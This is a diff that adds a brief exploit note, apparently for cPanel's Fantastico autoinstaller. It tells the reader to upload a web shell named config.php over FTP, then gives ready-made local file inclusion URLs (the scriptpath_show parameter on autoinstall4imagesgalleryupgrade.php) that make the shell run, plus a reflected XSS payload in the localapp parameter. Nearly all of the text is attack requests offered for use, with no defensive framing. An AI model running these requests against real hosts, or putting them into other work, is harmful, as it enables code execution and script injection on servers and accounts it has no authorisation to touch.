@@ -1,0 +1,12 @@
+Local File Inclusion Vulnerability :
+
+Note : Rename your shell to config.php and upload with your ftp account in ./ directory .... , now login in cpanel and
+       enter vulnerable address in url ....
+
+
+https://www.example.com/frontend/x3/fantastico/autoinstall4imagesgalleryupgrade.php?action=GoAhead&scriptpath_show=/home/[youruser]/
+https://www.example.com/frontend/x2/fantastico/autoinstall4imagesgalleryupgrade.php?action=GoAhead&scriptpath_show=/home/[youruser]/
+https://www.example.com/frontend/x/fantastico/autoinstall4imagesgalleryupgrade.php?action=GoAhead&scriptpath_show=/home/[youruser]/
+
+https://www.example.com/frontend/x3/fantastico/autoinstall4imagesgalleryupgrade.php?action=Upgrade%20to%201.7.4&localapp=%22%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+
